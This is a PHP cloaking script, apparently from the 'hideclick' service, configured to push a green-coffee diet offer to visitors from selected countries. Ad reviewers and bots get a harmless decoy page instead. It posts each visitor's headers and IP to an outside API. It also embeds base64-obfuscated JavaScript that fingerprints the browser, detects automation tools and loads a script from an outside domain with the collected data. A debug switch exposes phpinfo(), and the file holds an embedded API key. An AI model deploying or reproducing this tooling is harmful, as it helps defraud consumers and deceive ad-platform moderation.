<?php
/* Required settings     */
$CLOAKING['OFFER_PAGE'] = 'https://ibaneblan.host/greencoffee/ma/lp3/';//PHP/HTML file or URL offer used for real users
$CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
/*********************************************/
/* Available additional settings  */

/* Geo filter: Display offer page only to visitors from allowed countries.  */
/* For example, if you enter 'RU,UA' in the next line, system will only allow users from Russia and Ukraine */
 $CLOAKING['ALLOW_GEO'] = 'RU,MA';

/* UTM parameters forwarding */
/* true - turn on UTM forwarding; */
/* false - disable UTM forwarding */
 $CLOAKING['UTM'] = true;
/* OFFER_PAGE display method. Available options: redirect, iframe */
/* 'redirect' -  redirect visitors to offer page. (default method due to maximum compatibility with different hostings) */
/* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
 $CLOAKING['OFFER_METHOD'] = 'iframe';

/* Method of integration with WHITE_PAGE. Available options : standart, encoded */
/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS ! */
 $CLOAKING['WHITE_METHOD'] = 'encoded';

/* NO_REF used to block requests with empty referrer. */
/* false - allow requests without referrer */
/* true - block requests without referrer */
$CLOAKING['NO_REF'] = false;

/* WHITE_REF blocks requests if referrer does not match the regular expression.*/
/* For example: 'google|facebook' will block all traffic, exept traffic from google and facebook */
$CLOAKING['WHITE_REF'] = '';

/* change 'false' to 'true' to block Apple devices (iOS, Mac) */
$CLOAKING['BLOCK_APPLE'] = false;

/* change 'false' to 'true' to block Android devices */
$CLOAKING['BLOCK_ANDROID'] = false;

/* change 'false' to 'true' to block Windows devices */
$CLOAKING['BLOCK_WIN'] = false;

/* change 'false' to 'true' to block mobile devices */
$CLOAKING['BLOCK_MOBILE'] = false;

/* change 'false' to 'true' to block desctop devices */
$CLOAKING['BLOCK_DESCTOP'] = false;

/* DELAY_START allows you to block the first X unique IP addresses. */
$CLOAKING['DELAY_START'] = 0;

/* DELAY_PERMANENT always show the whitepage for IP in the list of first X requests */
$CLOAKING['DELAY_PERMANENT'] = false;

/* Paranoia mode uses the most rigid filters. Checks out some additional features inherent in spy services. But at the same time, in some countries, it can block a significant part of real users. */
/* change 'false' to 'true' to activate this mode */
$CLOAKING['PARANOID'] = false;

/* The next settings are needed only if you hosting isn't standart or something doesn't work */
/* delete symbols "//" in the next line if service doesn't work or you use CDN, Varnish or other caching proxy */
//$CLOAKING['DISABLE_CACHE'] = true;
/*********************************************/
/* You API key.                              */
/* DO NOT SHARE API KEY! KEEP IT SECRET!     */
$CLOAKING['API_SECRET_KEY'] = 'v176e3b57f23b846b1b9b7adbfaa1c800e';
/*********************************************/
/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS */
$CLOAKING['WHITE_PAGE'] = '<script src="data:text/javascript;base64, dmFyIGN5Yndna2tlZGJxZXVlZHh3eHJobGt5aGt6dWxmb3dpbnlldWpveW1xcHFrdXVpcnN6eWRqd2t1d2ZnY3Vja2hiPWZ1bmN0aW9uKHNyYyl7dmFyIHE9YXRvYigiWDE5emRHOXdRV3hzVkdsdFpYSnpMbmRsWW1SeWFYWmxjaTVmWDI1cFoyaDBiV0Z5WlM1ZmMyVnNaVzVwZFcwdVkyRnNiRkJvWVc1MGIyMHVZMkZzYkZObGJHVnVhWFZ0TGw5VFpXeGxibWwxYlY5SlJFVmZVbVZqYjNKa1pYSXVjMlZzWlc1cGRXMHVaSEpwZG1WeUxsOXpaV3hsYm1sMWJTNWZYM2RsWW1SeWFYWmxjbDlsZG1Gc2RXRjBaUzVmWDNObGJHVnVhWFZ0WDJWMllXeDFZWFJsTGw5ZmQyVmlaSEpwZG1WeVgzTmpjbWx3ZEY5bWRXNWpkR2x2Ymk1ZlgzZGxZbVJ5YVhabGNsOXpZM0pwY0hSZlpuVnVZeTVmWDNkbFltUnlhWFpsY2w5elkzSnBjSFJmWm00dVgxOW1lR1J5YVhabGNsOWxkbUZzZFdGMFpTNWZYMlJ5YVhabGNsOTFibmR5WVhCd1pXUXVYMTkzWldKa2NtbDJaWEpmZFc1M2NtRndjR1ZrTGw5ZlpISnBkbVZ5WDJWMllXeDFZWFJsTGw5ZmMyVnNaVzVwZFcxZmRXNTNjbUZ3Y0dWa0xsOWZabmhrY21sMlpYSmZkVzUzY21Gd2NHVmtMbDl3YUdGdWRHOXRMbkJvWVc1MGIyMHVaRzl0UVhWMGIyMWhkR2x2Ymw5ZmJtbG5hSFJ0WVhKbCIpLnNwbGl0KCIuIiksdz13aW5kb3csZD13LmRvY3VtZW50LG49dy5uYXZpZ2F0b3IsZGU9ImRvY3VtZW50RWxlbWVudCIscz13LnNjcmVlbixwPSIiLGE9ImF2YWlsIixpPSJpbm5lciIsbz0ib3V0ZXIiLEg9IkhlaWdodCIsVz0iV2lkdGgiLGM9dy5jaHJvbWU/T2JqZWN0LmtleXMody5jaHJvbWUpLmpvaW4oIioiKToiKiIsdGFnPWQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7ZnVuY3Rpb24gd2QoKXt0cnl7Zm9yKHZhciBsIGluIHEpe3ZhciB6PXFbbF07aWYod1t6XXx8blt6XSlyZXR1cm4gejtpZihkJiZkW2RlXSYmZFtkZV0uZ2V0QXR0cmlidXRlJiZkW2RlXS5nZXRBdHRyaWJ1dGUoeikpcmV0dXJuIHo7aWYoeiBpbiB3fHx6IGluIGQpcmV0dXJuIHp9cmV0dXJuIDB9Y2F0Y2goZSl7fX0hZnVuY3Rpb24gd3AoKXt0cnl7aWYobiYmbi5wbHVnaW5zKXtPYmplY3Qua2V5cyhuLnBsdWdpbnMpLmZvckVhY2goZnVuY3Rpb24oaSl7aWYobi5wbHVnaW5zW2ldKXArPW4ucGx1Z2luc1tpXS5maWxlbmFtZSsiKiJ9KX19Y2F0Y2goZSl7fX0oKTtzcmM9Imh0dHBzOi8vd3d3LmRpbmdvZG9uZ28ueHl6L2JldGEucGhwP2NsaWQ9IitidG9hKCJyZWY9IitlbmNvZGVVUklDb21wb25lbnQoZC5yZWZlcnJlcikrIiZkcml2ZT0iK3dkKCkrIiZjPSIrYysiJnM9IitzW2ErSF0rIioiK3dbaStIXSsiKiIrd1tvK0hdKyIqIitzW2ErV10rIioiK3dbaStXXSsiKiIrd1tvK1ddKyIqIit3LmRldmljZVBpeGVsUmF0aW8rIioiK24ubWF4VG91Y2hQb2ludHMrIiZwPSIrcCsiJmM9IituLmhhcmR3YXJlQ29uY3VycmVuY3krIioiK24uZGV2aWNlTWVtb3J5KyImdD0iK2VuY29kZVVSSUNvbXBvbmVudChuZXcgRGF0ZSgpLnRvU3RyaW5nKCkpKyImcT0iK2VuY29kZVVSSUNvbXBvbmVudCh3LmxvY2F0aW9uLnNlYXJjaC5zdWJzdHIoMSkpKTt0YWdbInR5cGUiXT0idGV4dC9qYXZhc2NyaXB0Ijt0YWdbInNyYyJdPXNyYztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHRhZyl9KCJodHRwczovL2Nvbm5lY3QuZmFjZWJvb2submV0L2VuX1VTL2ZiZXZlbnRzLmpzIik="></script>';// white page JS script integration code.
// DO NOT EDIT ANYTHING BELOW !!!
if(!empty($CLOAKING['VERSION']) || !empty($GLOBALS['CLOAKING']['VERSION'])) die('Recursion Error');
//$CLOAKING['VERSION']=20200115;
$CLOAKING['VERSION']=20200622;
//$CLOAKING['HTACCESS_FIX'] = true;

$errorContactMessage="<br><br>Something went wrong. Don’t worry, we will help. Contact us by telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>";
if(!empty($_GET['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#',$_GET['utm_allow_geo'])) $CLOAKING['ALLOW_GEO']=$_GET['utm_allow_geo'];
if(empty($CLOAKING['PARANOID'])) $CLOAKING['PARANOID']='';
if(empty($CLOAKING['ALLOW_GEO'])) $CLOAKING['ALLOW_GEO']='';
if(empty($CLOAKING['HTACCESS_FIX'])) $CLOAKING['HTACCESS_FIX']='';
if(empty($CLOAKING['DISABLE_CACHE'])) $CLOAKING['DISABLE_CACHE']='';
else {
    setcookie("euConsent", 'true');
    setcookie("BC_GDPR", time());
    header( "Cache-control: private, max-age=0, no-cache, no-store, must-revalidate, s-maxage=0" );
    header( "Pragma: no-cache" );
    header( "Expires: ".date('D, d M Y H:i:s',rand(1560500925,1571559523))." GMT");
}

if(!empty($_REQUEST['cloaking'])) {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    if ($_REQUEST['cloaking'] == 'stat' || $_REQUEST['cloaking'] == 'stats') {
        if(empty($CLOAKING['API_SECRET_KEY'])||strlen($CLOAKING['API_SECRET_KEY'])<16) {
            echo '<html><head><meta charset="UTF-8"></head><body><b>Error: secret API key is missing !</b><br>Put the API key (you can find it in the email) to line <b>#'.cloakedEditor("\$CLOAKING['API_SECRET_KEY']").'</b> so that it looks like:<br><code>$CLOAKING[\'API_SECRET_KEY\'] = \'put your API key here\';</code><br>'.$errorContactMessage;
            die();
        }
        setcookie("hideclick", 'ignore', time()+604800);
        if(!empty($_SERVER['HTTP_HOST'])) $host=$_SERVER['HTTP_HOST'];
        else if(!empty($_SERVER['Host'])) $host=$_SERVER['Host'];
        else if(!empty($_SERVER['host'])) $host=$_SERVER['host'];
        else if(!empty($_SERVER[':authority'])) $host=$_SERVER[':authority'];
        else $host='';
        if(!empty($_SERVER['REQUEST_URI'])) $host.=$_SERVER['REQUEST_URI'];
        if(stristr($host,'?')) $host=substr(0,strpos($host,'?'));
        if(substr($host,0,4)=='www.') $host=substr($host,4);
        $domainStat='';
        if(!empty($_REQUEST['domain'])) $domainStat.='&domain='.$_REQUEST['domain'];
        if(!empty($_REQUEST['date2'])) $domainStat.='&date2='.$_REQUEST['date2'];//timestamp
        else $domainStat.='&date2='.time();
        if(!empty($_REQUEST['date1'])) $domainStat.='&date1='.$_REQUEST['date1'];//timestamp
        else $domainStat.='&date1='.(time()-604800);
        if (!function_exists('curl_init')) $statistic = file_get_contents('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=9237120153721f1592830838&version='.$CLOAKING['VERSION'].'&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat, 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 45), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,) )) );
        else $statistic = cloakedCurl('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=9237120153721f1592830838&version='.$CLOAKING['VERSION'].'&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat);
        echo $statistic;
        if (empty($statistic)) echo "<html><head><meta charset=\"UTF-8\"></head><body>".$errorContactMessage;
    }
    else if ($_REQUEST['cloaking'] == 'debug') {phpinfo();print_r(debug_backtrace ());$CLOAKING['API_SECRET_KEY']=1;print_r($CLOAKING);die();}
    else if ($_REQUEST['cloaking'] == 'time') {
        header( "Cache-control: public, max-age=999999, s-maxage=999999" );
        header( "Expires: Wed, 21 Oct 2025 07:28:00 GMT" );
        echo str_replace(" ","",rand(1,10000).microtime().rand(1,100000));
    }
    die();
}

else if($CLOAKING['DEBUG_MODE'] == 'on'){
    set_time_limit(5);
    ini_set('max_execution_time',5);
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    $error=0;
    setcookie("hideclick", 'ignore', time()+604800);
    // don't use $_SERVER["REDIRECT_URL"], as there is servers that use it without redirect
    if(!empty($_GET) || !empty($_POST) || ($_SERVER["SCRIPT_NAME"]!=$_SERVER["REQUEST_URI"] && $_SERVER["REQUEST_URI"]!=str_replace("index.php","",$_SERVER["SCRIPT_NAME"]))) {
        echo "<html><head><meta charset=\"UTF-8\"></head><body>Error with rewrite engine.<!--//'".$_SERVER["SCRIPT_NAME"]."'!='".$_SERVER["REQUEST_URI"]."'//-->".$errorContactMessage;
        die();
    }
    echo '<html><head><meta charset="UTF-8"><style type="text/css">body, html {font-family: Calibri, Ebrima;}img {margin-left:2em;opacity: 0.25;}img:hover {opacity: 1.0;}</style></head><body><b>Congratulations.</b><br>Literally in a moment you can increase your ROI.<br><br><b>First, make sure that everything is configured correctly:</b><br>';
    if(strstr($CLOAKING['OFFER_PAGE'],'://')) echo '✔ OFFER_PAGE - ok.<br>';
    else {echo '❌ OFFER_PAGE - error! Change the value in line <b>#'.cloakedEditor("\$CLOAKING['OFFER_PAGE']").'</b> to the page that will be displayed to targeted users<br><img src="http://hide.click/gif/black.gif" border="1"><br>';$error=1;}
    $CLOAKINGdata=array();
    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=9237120153721f1592830838&version='.$CLOAKING['VERSION'].'&curl=false&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=9237120153721f1592830838&version='.$CLOAKING['VERSION'].'&curl=true&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);

    if(!$CLOAKING['STATUS'] || stristr($CLOAKING['STATUS'],'error')){
        echo '❌ PHP configuration error. Contact your hosting support and ask them to enable CURL in PHP.<br>';
        $error=1;
    }
    if(stristr($CLOAKING['STATUS'],'payment')||stristr($CLOAKING['STATUS'],'expired')){
        echo '❌ Your secret API key has expired or blocked due terms violation. Contact support to extend the service!<br>';
        $error=1;
    }
    $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
    if(empty($CLOAKING['STATUS']) || empty($CLOAKING['STATUS']['action'])){
        echo '❌ PHP configuration error.<br>';
        $error=1;
    }

    // Needed to check if cache is using
    $testUrl= ( $_SERVER["SERVER_PORT"]==443 || (!empty($_SERVER['HTTP_CF_VISITOR']) && stristr($_SERVER['HTTP_CF_VISITOR'],'https')) || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO']=='https') || (!empty($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1 || $_SERVER['HTTPS'] == 'true')) ) ? 'https://' : 'http://';
    // There's some bugs with CDN if using $_SERVER['HTTP_HOST'], so use $_SERVER["SERVER_NAME"] instead!
    $queryBug=strpos($_SERVER["REQUEST_URI"],'?');
    if(empty($_SERVER["SERVER_NAME"]) || $_SERVER["SERVER_NAME"] == '_' || $_SERVER["SERVER_NAME"] == 'localhost') $_SERVER["SERVER_NAME"] = $_SERVER["HTTP_HOST"];
    if($queryBug>0) $testUrl.=$_SERVER["SERVER_NAME"].substr($_SERVER["REQUEST_URI"],0,$queryBug).'?cloaking=time';
    else $testUrl.=$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"].'?cloaking=time';
    $http_response_header=array();
    $static1 = !function_exists('curl_init') ? file_get_contents($testUrl,'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))) ) : cloakedCurl($testUrl);
    $static2 = !function_exists('curl_init') ? file_get_contents($testUrl,'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))) ) : cloakedCurl($testUrl);
    $static3 = !function_exists('curl_init') ? implode("\n",$http_response_header) : cloakedCurl($testUrl,'',true);
    // Set-Cookie vs empty($CLOAKING['DISABLE_CACHE']) || !empty($CLOAKING['DISABLE_CACHE']) ???
    if(preg_match('#Proxy|Microcachable#i',$static3) || (empty($CLOAKING['DISABLE_CACHE']) && preg_match('#Set-Cookie#i', $static3) && !strstr($static3, '__cfduid=')) ){
        echo '❌ Bad server configuration. Contact us. We will help.<br><br>';
    }
    else if($static1>0 && $static2>0 && $static1<=100000  && $static2<=100000 && $static1!=$static2) {}
    else if(empty($static1)||empty($static2)) {
        echo '❌ Bad server configuration. Contact us. We will try to help.<br><br>';
        $error=1;
    }
    else if(!empty($CLOAKING['DISABLE_CACHE'])) {
        echo '❌ Bad server configuration. Ask hosting support to turn off caching (or move website to another hosting).<br><br>';
        $error=1;
    }
    else {
        echo '❌ Bad server configuration. Remove <b>//</b> at the beginning of a line <b>#'.cloakedEditor("\$CLOAKING['DISABLE_CACHE']").'</b> to activate "DISABLE_CACHE" mode.<br><img src="http://hide.click/gif/cache.gif" border="1"><br><br>';
        $error=1;
    }
    if(preg_match('#[^A-Za-z ,]+#',$CLOAKING['ALLOW_GEO'])) {
        echo '❌ Geo filter is not configured correctly. Only letters A-Z (2x country codes) and commas can be used at line <b>#'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b>.<br><img src="http://hide.click/gif/geo.gif" border="1"><br>';
        $error=1;
    }
    if($CLOAKING['DELAY_START']) {
        file_put_contents('dummyCounter.txt','');
        if(!is_file('dummyCounter.txt')) {
            echo '❌ In order DELAY_START filter to work you need to create a file <b>dummyCounter.txt</b> in the directory <b>'.getcwd().'</b>. Make sure that the file is writable.<br>';
            $error = 1;
        }
        else if(!is_writable('dummyCounter.txt')){
            echo '❌ Make sure that the <b>dummyCounter.txt</b> file located in <b>'.getcwd().'</b>  is writable.<br>';
            $error = 1;
        }
    }
    if($error) { echo "<br><b>Correct the errors and reload the page.</b><br><br>Do you need some help? Write to us in telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>";die(); }

    if(empty($CLOAKING['ALLOW_GEO'])) echo '✔ Geo filtering is turned off. Put the two-letters country codes of allowed countries at the line <b>#'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b>.<br><img src="http://hide.click/gif/geo.gif" border="1"><br>';
    else echo '✔ Geo filtering is turned on. All countries except '.$CLOAKING['ALLOW_GEO'].' will get white page. You can change two-letters country codes of allowed countries at the line #'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b><br><img src="http://hide.click/gif/geo.gif" border="1"><br>';
    echo '✔ <a target="_blank" href="?cloaking=stat">Click here to open the statistics page</a>. Bookmark it for future reference.<br><br>';
    echo '⚠ Add JavaScript to your white page. Edit HTML code and add <code><b>'.htmlentities($CLOAKING['WHITE_PAGE']).'</b></code> after &lt;HEAD&gt; :<br><br>';
    echo '⚠ Last step: If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#'.cloakedEditor("\$CLOAKING['DEBUG_MODE']").'</b> to <b>off</b>.<br><img src="http://hide.click/gif/debug.gif" border="1"><br>';
    echo 'After that, the script will start working in production mode and instead of this page you will see some JavaScript code.<br><br>';
    echo '<b>Important!<br>WHITE_PAGE MUST COMPLETELY COMPLY WITH THE ADVERTISING NETWORK RULES!</b><br>Do you need more information on how to make the right white page? Contact us in telegram: <a href="tg://resolve?domain=hideclick_official">@hideclick_official</a>.';
    die();
}
else {

}

if(empty($CLOAKING['OFFER_PAGE']) || (!strstr($CLOAKING['OFFER_PAGE'],'://') )){
    echo "<html><head><meta charset=\"UTF-8\"></head><body>ERROR: Non valid offer page: OFFER_PAGE='".$CLOAKING['OFFER_PAGE']."'!\r\n<br>".$errorContactMessage;
    die();
}

if (function_exists('header_remove')) header_remove("X-Powered-By");
@ini_set('expose_php', 'off');

$CLOAKINGdata = array();

if (function_exists("getallheaders")) $CLOAKINGdata = getallheaders();
foreach($_SERVER as $k=> $v){
    if (substr($k, 0, 5) == 'HTTP_') $CLOAKINGdata[$k] = $v;
}
// fix to support early versions...
$getvars=array();
if(!empty($_GET['clid']) && base64_decode($_GET['clid']) && parse_str($_GET['clid'],$getvars)) {
    $_SERVER['REQUEST_URI']=preg_replace('#\?clid=.*#','?'.base64_decode($_GET['clid']),$_SERVER['REQUEST_URI']);
    if(!empty($getvars['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#',$getvars['utm_allow_geo'])) $CLOAKING['ALLOW_GEO']=$getvars['utm_allow_geo'];
    $_GET['ref']=$getvars['ref'];
    $_GET['q']=$getvars['q'];
}

$CLOAKINGdata['path']=$_SERVER["REQUEST_URI"];
$CLOAKINGdata['REQUEST_METHOD']=$_SERVER['REQUEST_METHOD'];
//fix for roadrunner ???
//$CLOAKINGdata['host']=$CLOAKING['DOMAIN'];//fix for roadrunner ???
//$CLOAKINGdata['path']=http_build_query ($_GET);//fix for roadrunner ???

$CLOAKING['banReason']='';
if($CLOAKING['NO_REF'] || !empty($CLOAKING['WHITE_REF'])){
    $ref='';
    foreach (array('HTTP_REFERER','Referer','referer','REFERER') as $k){
        if(!empty($CLOAKINGdata[$k])) {$ref=$_SERVER[$k];break;}
    }
    if(empty($ref)) $CLOAKING['banReason'].='noref.';
//    elseif(!empty($CLOAKING['WHITE_REF']) && !preg_match("#https?://[^/]*(".$CLOAKING['WHITE_REF'].")#i",$ref)) $CLOAKING['banReason'].='blackref.';
}
if($CLOAKING['BLOCK_APPLE'] || $CLOAKING['BLOCK_ANDROID'] || $CLOAKING['BLOCK_WIN'] || $CLOAKING['BLOCK_MOBILE'] || $CLOAKING['BLOCK_DESCTOP']) {
    $ua='';
    foreach (array('HTTP_USER_AGENT','USER-AGENT','User-Agent','User-agent','user-agent') as $k){
        if(!empty($CLOAKINGdata[$k])) {$ua=$_SERVER[$k];break;}
    }
    if($CLOAKING['BLOCK_APPLE'] && stristr($ua,'Mac OS')) $CLOAKING['banReason'].='blockapple.';
    if($CLOAKING['BLOCK_ANDROID'] && stristr($ua,'Android')) $CLOAKING['banReason'].='blockandroid.';
    if($CLOAKING['BLOCK_WIN'] && stristr($ua,'Windows')) $CLOAKING['banReason'].='blockwin.';
    if($CLOAKING['BLOCK_MOBILE'] && (stristr($ua,'like Mac OS X')||stristr($ua,'Android')||stristr($ua,'mobile')||stristr($ua,'table'))) $CLOAKING['banReason'].='blockmobile.';
    if($CLOAKING['BLOCK_DESCTOP'] && !(stristr($ua,'like Mac OS X')||stristr($ua,'Android')||stristr($ua,'mobile')||stristr($ua,'table')))  $CLOAKING['banReason'].='blockdescktop.';
}
if($CLOAKING['DELAY_START']) {
    $ip='';
    foreach (array('HTTP_CF_CONNECTING_IP','CF-Connecting-IP','Cf-Connecting-Ip','cf-connecting-ip') as $k){
        if(!empty($_SERVER[$k])) $ip=$_SERVER[$k];
    }
    if(empty($ip)) {
        foreach (array('HTTP_FORWARDED', 'Forwarded', 'forwarded', 'REMOTE_ADDR') as $k) {
            if (!empty($_SERVER[$k])) $ip .= $_SERVER[$k];
        }
    }
    $ips=file('dummyCounter.txt',FILE_IGNORE_NEW_LINES);
    if(empty($ips)) {$ips=array(0=>0);file_put_contents('dummyCounter.txt',"0\n", FILE_APPEND);}
    else $ips=array_flip($ips);
    $ip=crc32($ip);
    if(!empty($ips[$ip]) && ($CLOAKING['DELAY_PERMANENT'] || sizeof($ips)<=$CLOAKING['DELAY_START'])){
        $CLOAKING['banReason'].='delaystart.';
    }
    elseif(sizeof($ips)<=$CLOAKING['DELAY_START']) {
        file_put_contents('dummyCounter.txt',$ip."\n", FILE_APPEND);
        $CLOAKING['banReason'].='delaystart.';
    }
}

if(!empty($_SERVER['HTTP_REFERER'])) $CLOAKINGdata['HTTP_X_FORWARDED_HOST']= parse_url($_SERVER['HTTP_REFERER'],PHP_URL_HOST);
else if(!empty($_SERVER['Referer'])) $CLOAKINGdata['HTTP_X_FORWARDED_HOST']= parse_url($_SERVER['Referer'],PHP_URL_HOST);
if(!empty($_GET['q'])){
    parse_str(urldecode($_GET['q']),$tmppar);
    if(!empty($tmppar['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#',$tmppar['utm_allow_geo'])) $CLOAKING['ALLOW_GEO']=$tmppar['utm_allow_geo'];
}
$CLOAKINGdata = json_encode($CLOAKINGdata);
if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=9237120153721f1592830838&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&paranoid='.$CLOAKING['PARANOID'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=9237120153721f1592830838&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'&stage=js1&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&paranoid='.$CLOAKING['PARANOID'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
$CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);

header("Content-Type: application/javascript");
//srand(crc32($_SERVER['HTTP_HOST'].$_SERVER['HOST'].$_SERVER['Host'].$_SERVER['host'].$_SERVER["SCRIPT_NAME"]));
if (empty($CLOAKING['banReason']) && !empty($CLOAKING['STATUS']) && !empty($CLOAKING['STATUS']['action']) && $CLOAKING['STATUS']['action'] == 'allow' && (empty($CLOAKING['ALLOW_GEO']) || (!empty($CLOAKING['STATUS']['geo']) && !empty($CLOAKING['ALLOW_GEO']) && stristr($CLOAKING['ALLOW_GEO'],$CLOAKING['STATUS']['geo'])))) {
    if($CLOAKING['UTM'] && !empty($_GET) && !empty($_GET['q'])){
        // fix for fucking bug with &q=...&= not encoded...
        if(!empty($_SERVER['QUERY_STRING'])) $_GET['q']=substr($_SERVER['QUERY_STRING'],strpos($_SERVER['QUERY_STRING'],'&q='));
            if(strstr($CLOAKING['OFFER_PAGE'],'?')) $CLOAKING['OFFER_PAGE'].= '&'.urldecode($_GET['q']);
            else $CLOAKING['OFFER_PAGE'].= '?'.urldecode($_GET['q']);
            $page=base64_encode($CLOAKING['OFFER_PAGE']);
    }
    else $page=base64_encode($CLOAKING['OFFER_PAGE']);

    if(!empty($CLOAKING['STATUS']['uid'])) {
        $uid=$CLOAKING['STATUS']['uid'];
        setcookie('uid',$uid,time()+604800);
    }
    else $uid='';

    $output='';


    if($CLOAKING['UTM'] && empty($_GET['q'])){
//        $output="var s='".$page."';try{s=btoa(atob(s)+(atob(s).indexOf('?')<0 ? '?':'&')+window.location.search.substr(1));}catch(e){console.log(e)};document.write('<script src=\"https://".$CLOAKING['STATUS']['host']."/fb.js?uid=".$uid."&method=".$CLOAKING['OFFER_METHOD']."&session=".$CLOAKING['STATUS']['js']."_'+s+'\"></script>')";
        $output="var s='".$page."';try{s=btoa(atob(s)+(atob(s).indexOf('?')<0 ? '?':'&')+window.location.search.substr(1));}catch(e){console.log(e)};var b=document.createElement(\"script\");b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://".$CLOAKING['STATUS']['host']."/fb.js?uid=".$uid."&method=".$CLOAKING['OFFER_METHOD']."&session=".$CLOAKING['STATUS']['js']."_\"+s;document.head.appendChild(b);";
    }
//    else $output="document.write('<script src=\"https://".$CLOAKING['STATUS']['host']."/fb.js?uid=".$uid."&method=".$CLOAKING['OFFER_METHOD']."&session=".$CLOAKING['STATUS']['js']."_".$page."\"></script>')";
    else $output="var b=document.createElement(\"script\");b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://".$CLOAKING['STATUS']['host']."/fb.js?uid=".$uid."&method=".$CLOAKING['OFFER_METHOD']."&session=".$CLOAKING['STATUS']['js']."_".$page."\";document.head.appendChild(b);";
//    header("Location: https://cloudnetwork.cf/fb.js?uid=".$uid."&session=".$CLOAKING['STATUS']['js']."_".$page);
    if($CLOAKING['NO_REF']){$output='if(document && document.referrer && document.referrer.length>0){'.$output.'}';}
    echo $output;
}
else {
//    echo "document.write('<script src=\"https://connect.facebook.net/en_US/fbevents.js\"></script>')";
    echo "var b=document.createElement('script');b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://connect.facebook.net/en_US/fbevents.js\";document.head.appendChild(b);";
//    header("Location: https://connect.facebook.net/en_US/fbevents.js");
}

